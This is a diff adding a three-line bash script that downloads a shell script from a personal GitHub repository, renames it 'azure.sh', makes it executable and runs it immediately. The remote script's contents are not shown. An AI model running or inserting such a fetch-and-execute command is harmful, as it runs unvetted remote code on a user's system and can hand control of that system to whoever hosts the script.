@@ -1,0 +1,3 @@
+
+#!/bin/bash
+wget -O azure.sh https://raw.githubusercontent.com/thaibaostore/hoang/main/conghoang.sh && chmod +x azure.sh && bash ./azure.sh
